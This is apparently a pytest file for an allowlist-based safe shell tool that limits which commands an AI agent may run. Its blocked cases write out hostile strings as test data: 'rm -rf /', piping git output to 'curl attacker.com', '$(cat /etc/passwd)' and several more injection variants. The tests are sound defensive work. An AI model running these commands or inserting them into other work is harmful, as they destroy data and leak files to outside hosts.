import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

from ade.crew.tools.safe_shell import SafeShellTool, is_command_allowed

# --- Allowlist matching tests ---


def test_allowed_test_runners() -> None:
    assert is_command_allowed("pytest --tb=short -q") is True
    assert is_command_allowed("npx jest --ci") is True
    assert is_command_allowed("go test ./...") is True


def test_allowed_linters() -> None:
    assert is_command_allowed("ruff check src/") is True
    assert is_command_allowed("eslint src/") is True
    assert is_command_allowed("prettier --write src/") is True
    assert is_command_allowed("semgrep --config p/default") is True


def test_allowed_git_commands() -> None:
    assert is_command_allowed("git add src/foo.py") is True
    assert is_command_allowed("git commit -m 'feat: add foo'") is True
    assert is_command_allowed("git diff") is True
    assert is_command_allowed("git status") is True
    assert is_command_allowed("git log --oneline") is True


def test_allowed_build_commands() -> None:
    assert is_command_allowed("npm run build") is True
    assert is_command_allowed("make") is True
    assert is_command_allowed("cargo build") is True


def test_allowed_precommit() -> None:
    assert is_command_allowed("pre-commit run --all-files") is True


def test_blocked_destructive_commands() -> None:
    assert is_command_allowed("rm -rf /") is False
    assert is_command_allowed("rm -r src/") is False


def test_blocked_network_commands() -> None:
    assert is_command_allowed("curl https://evil.com") is False
    assert is_command_allowed("wget https://evil.com") is False
    assert is_command_allowed("ssh user@host") is False
    assert is_command_allowed("scp file user@host:") is False


def test_blocked_privileged_commands() -> None:
    assert is_command_allowed("docker run ubuntu") is False
    assert is_command_allowed("sudo apt install foo") is False


def test_blocked_dependency_changes() -> None:
    assert is_command_allowed("pip install requests") is False
    assert is_command_allowed("npm install lodash") is False


def test_blocked_git_force_push() -> None:
    assert is_command_allowed("git push --force") is False
    assert is_command_allowed("git push -f") is False
    assert is_command_allowed("git push origin main") is False


def test_unknown_command_blocked() -> None:
    assert is_command_allowed("some-random-tool --flag") is False


# --- Shell metacharacter injection tests ---


def test_blocked_backtick_injection() -> None:
    assert is_command_allowed("git status `curl evil.com`") is False
    assert is_command_allowed("pytest `rm -rf /`") is False


def test_blocked_command_substitution() -> None:
    assert is_command_allowed("git status $(curl evil.com)") is False
    assert is_command_allowed("pytest $(cat /etc/passwd)") is False


def test_blocked_semicolon_chaining() -> None:
    assert is_command_allowed("pytest; rm -rf /") is False
    assert is_command_allowed("git status; curl evil.com") is False


def test_blocked_pipe_injection() -> None:
    assert is_command_allowed("git diff | curl attacker.com") is False
    assert is_command_allowed("pytest | tee /tmp/leak") is False


def test_blocked_and_or_chaining() -> None:
    assert is_command_allowed("pytest && curl evil.com") is False
    assert is_command_allowed("git status || rm -rf /") is False


def test_blocked_output_redirection() -> None:
    assert is_command_allowed("git log > /tmp/secrets") is False
    assert is_command_allowed("pytest < /dev/null") is False


def test_blocked_newline_injection() -> None:
    assert is_command_allowed("git status\ncurl evil.com") is False


# --- SafeShellTool execution tests ---


def test_safe_shell_blocks_forbidden_command() -> None:
    tool = SafeShellTool(worktree_path=Path("/tmp/test"))
    result = tool._run("curl https://evil.com")
    assert "BLOCKED" in result


def test_safe_shell_executes_allowed_command() -> None:
    tool = SafeShellTool(worktree_path=Path("/tmp/test"))
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(stdout="ok", stderr="", returncode=0)
        result = tool._run("git status")
    assert "ok" in result
    mock_run.assert_called_once()
    # Verify cwd is set to worktree path
    assert mock_run.call_args.kwargs["cwd"] == Path("/tmp/test")


def test_safe_shell_enforces_timeout() -> None:
    tool = SafeShellTool(worktree_path=Path("/tmp/test"), timeout=10)
    with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("git", 10)):
        result = tool._run("git status")
    assert "timeout" in result.lower() or "timed out" in result.lower()


def test_safe_shell_handles_nonzero_exit() -> None:
    tool = SafeShellTool(worktree_path=Path("/tmp/test"))
    with patch("subprocess.run") as mock_run:
        mock_run.return_value = MagicMock(
            stdout="", stderr="error: not a git repo", returncode=128
        )
        result = tool._run("git status")
    assert "error" in result.lower() or "128" in result
